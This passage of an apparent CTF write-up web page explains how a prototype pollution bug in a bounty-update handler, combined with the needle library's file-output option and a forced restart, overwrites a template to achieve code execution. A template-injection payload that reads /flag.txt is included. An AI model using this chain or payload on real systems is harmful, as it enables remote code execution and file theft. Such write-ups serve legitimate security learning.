+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> updated</span><span style="color:#444444"> =</span><span style="color:#80A665"> mergedeep</span><span style="color:#444444">(</span><span style="color:#BD976A">data</span><span style="color:#444444">.</span><span style="color:#80A665">toJSON</span><span style="color:#444444">(),</span><span style="color:#BD976A"> bountyData</span><span style="color:#444444">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    await</span><span style="color:#BD976A"> data</span><span style="color:#444444">.</span><span style="color:#80A665">update</span><span style="color:#444444">(</span><span style="color:#BD976A">updated</span><span style="color:#444444">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">json</span><span style="color:#444444">(</span><span style="color:#BD976A">updated</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">    }</span><span style="color:#4D9375"> catch</span><span style="color:#444444"> (</span><span style="color:#BD976A">err</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    console</span><span style="color:#444444">.</span><span style="color:#80A665">log</span><span style="color:#444444">(</span><span style="color:#BD976A">err</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">500</span><span style="color:#444444">).</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Error fetching data</span><span style="color:#C98A7D77">"</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"><span style="color:#444444">};</span></span></code></pre>
+<p>This function retrieves a bounty by its primary key, performs a deep merge with the provided <code>bountyData</code>, and updates the database. However, it is vulnerable to prototype pollution, allowing an attacker to overwrite properties of the prototype object.</p>
+<p>To exploit this, we need a gadget that allows significant impact. Examining the libraries used by this application:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> needle</span><span style="color:#444444"> =</span><span style="color:#80A665"> require</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">needle</span><span style="color:#C98A7D77">"</span><span style="color:#444444">);</span></span></code></pre>
+<p>The <code>needle</code> library has an option to write the output of a request to a file:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>output: Dump response output to file. This occurs after parsing and charset decoding is done.</span></span></code></pre>
+<p>By setting this option to a file and making a web request, we can overwrite files. This allows us to overwrite a Node.js template and achieve RCE through it. Additionally, there’s an unhandled error that can be exploited to crash the application, causing Supervisord to restart it with the updated malicious template. That way we can achieve RCE.</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#80A665"> fetchURL</span><span style="color:#444444"> =</span><span style="color:#CB7676"> async</span><span style="color:#444444"> (</span><span style="color:#BD976A">url</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    if</span><span style="color:#444444"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">url</span><span style="color:#444444">.</span><span style="color:#80A665">startsWith</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">http://</span><span style="color:#C98A7D77">"</span><span style="color:#444444">)</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#CB7676"> !</span><span style="color:#BD976A">url</span><span style="color:#444444">.</span><span style="color:#80A665">startsWith</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">https://</span><span style="color:#C98A7D77">"</span><span style="color:#444444">))</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    throw</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Error</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Invalid URL: URL must start with http or https</span><span style="color:#C98A7D77">"</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> options</span><span style="color:#444444"> =</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#B8A965">    compressed</span><span style="color:#444444">:</span><span style="color:#4D9375"> true</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#B8A965">    follow_max</span><span style="color:#444444">:</span><span style="color:#4C9A91"> 0</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#444444">    };</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#CB7676"> new</span><span style="color:#B8A965"> Promise</span><span style="color:#444444">((</span><span style="color:#BD976A">resolve</span><span style="color:#444444">,</span><span style="color:#BD976A"> reject</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    needle</span><span style="color:#444444">.</span><span style="color:#80A665">get</span><span style="color:#444444">(</span><span style="color:#BD976A">url</span><span style="color:#444444">,</span><span style="color:#BD976A"> options</span><span style="color:#444444">,</span><span style="color:#444444"> (</span><span style="color:#BD976A">err</span><span style="color:#444444">,</span><span style="color:#BD976A"> resp</span><span style="color:#444444">,</span><span style="color:#BD976A"> body</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">        if</span><span style="color:#444444"> (</span><span style="color:#BD976A">err</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">        return</span><span style="color:#80A665"> reject</span><span style="color:#444444">(</span><span style="color:#CB7676">new</span><span style="color:#80A665"> Error</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Error fetching the URL: </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> err</span><span style="color:#444444">.</span><span style="color:#BD976A">message</span><span style="color:#444444">));</span></span>
+<span class="line"><span style="color:#444444">        }</span></span>
+<span class="line"><span style="color:#80A665">        resolve</span><span style="color:#444444">(</span><span style="color:#BD976A">body</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"><span style="color:#444444">};</span></span></code></pre>
+<p>After polluting and overwriting the template we can pass <code>file:///test</code> to restart the application, and utilise the following template payload to read content of flag</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#444444">{{</span><span style="color:#BD976A"> range</span><span style="color:#444444">.</span><span style="color:#80A665">constructor</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">return global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8')</span><span style="color:#C98A7D77">"</span><span style="color:#444444">)()</span><span style="color:#444444"> }}</span></span></code></pre>
+<p>This concludes the challenge!</p> </article> <div class="passages"> <div class="cap">SECRET PASSAGES · RELATED ENTRIES</div> <a href="/post/encodecept/"><b>EncoDecept</b> shared tag · ctf</a><a href="/post/nodemailer-parser-discrepancy/"><b>Nodemailer Parser</b> shared tag · nodemailer</a><a href="/post/sanitize-html-bypass-mxss/"><b>sanitize-html Bypass</b> shared tag · mxss</a> </div> <div class="finis"> <span class="stamp"> <svg width="78" height="78" viewBox="0 0 78 78" fill="none"> <g style="color:var(--wax)"><circle cx="39" cy="39" r="34" stroke="currentColor" stroke-width="1.6" opacity=".85"></circle> <circle cx="39" cy="39" r="28" stroke="currentColor" stroke-width=".8" opacity=".6"></circle> <text x="39" y="36" text-anchor="middle" fill="currentColor" style="font-family:'IM Fell English SC';font-size:13px;letter-spacing:.2em">FINIS</text> <text x="39" y="52" text-anchor="middle" fill="currentColor" style="font-family:'IM Fell English',serif;font-style:italic;font-size:9px" opacity=".85">mischief managed</text></g> </svg> </span> </div> <nav class="nav"> <a class="prev" href="/post/nodemailer-parser-discrepancy/"> <div class="d">← NEWER CORRIDOR</div> <div class="t">Email Parser Discrepancy in Nodemailer</div> <div class="w">nodemailer parser · nov 2024</div> </a> <a class="next" href="/post/encodecept/"> <div class="d">OLDER CORRIDOR →</div> <div class="t">EncoDecept: HTB University CTF 2024</div> <div class="w">encodecept · nov 2024</div> </a> </nav> <div class="foot"><a href="/">MISCHIEF MANAGED — RETURN TO THE MAP</a></div> </main> <script>
+/* editions — shared with the map via localStorage; night is default */
+(function(){
+  let ed='night';
+  try{ ed=localStorage.getItem('archive-ed')||'night'; }catch(e){}
+  if(ed==='day') document.documentElement.classList.add('day');
+  const btn=document.getElementById('themeBtn');
+  const lbl=()=>{ btn.textContent=document.documentElement.classList.contains('day')?'night edition':'day edition'; };
+  lbl();
+  btn.addEventListener('click',ev=>{
+    ev.preventDefault();
+    const veil=document.getElementById('veil');
+    veil.classList.add('on');
+    setTimeout(()=>{
+      const day=document.documentElement.classList.toggle('day');
+      try{ localStorage.setItem('archive-ed',day?'day':'night'); }catch(e){}
+      lbl();
+      setTimeout(()=>veil.classList.remove('on'),140);
+    },400);
+  });
+})();
+
+/* latin bands, same phrase as the map */
+(function(){
+  const phrase='OMNIBVS ARCHIVANTIBVS BONVM AVDERE EST ARCHIVARE  ✦  ';
+  let s=''; while(s.length<400) s+=phrase;
+  document.querySelector('#bandTop span').textContent=s;
+  document.querySelector('#bandBot span').textContent=s;
+})();
+
+/* ink-soak reveal: monotonic, quick, no blinking */
+(function(){
+  if(matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  const units=[...document.querySelectorAll('.seal,.title,.rule,.lede,.tags,.thresh,.doc > *,.passages,.finis,.nav,.foot')];
+  units.forEach((e,i)=>{
+    e.style.opacity='0';
+    const a=e.animate(
+      [{opacity:0,filter:'blur(2px)'},{opacity:1,filter:'blur(0px)'}],
+      {duration:1100,delay:120+Math.min(i*70,900)+Math.random()*180,
+       easing:'cubic-bezier(.33,.08,.35,1)',fill:'forwards'});
+    a.finished.then(()=>{a.cancel();e.style.opacity='';}).catch(()=>{});
+  });
+})();
+
+/* waypoints scrollspy + the reader's pacing feet */
+(function(){
+  const links=[...document.querySelectorAll('.rail a')];
+  if(!links.length) return;
+  const secs=links.map(a=>document.getElementById(a.getAttribute('href').slice(1)));
+  const feet=document.getElementById('feet');
+  function spy(){
+    const y=scrollY+150; let cur=0;
+    secs.forEach((s,i)=>{ if(s&&s.offsetTop<=y) cur=i; });
+    links.forEach((a,i)=>{
+      a.classList.toggle('active',i===cur);
+      a.classList.toggle('walked',i<cur);
+    });
+    /* feet walk the dotted line: interpolate within the current leg */
+    const rows=links.map(a=>a.parentElement);
+    const cA=rows[cur].offsetTop+6;
+    const cB=(rows[cur+1]?rows[cur+1].offsetTop:cA+26)+6;
+    const sTop=secs[cur]?secs[cur].offsetTop:0;
+    const sBot=secs[cur+1]?secs[cur+1].offsetTop:document.body.scrollHeight;
+    const k=Math.max(0,Math.min(1,(y-sTop)/Math.max(1,sBot-sTop)));
+    feet.style.top=(cA+(cB-cA)*k)+'px';
+  }
+  spy();
+  addEventListener('scroll',spy,{passive:true});
+  addEventListener('resize',spy);
+})();
+</script> </body> </html>
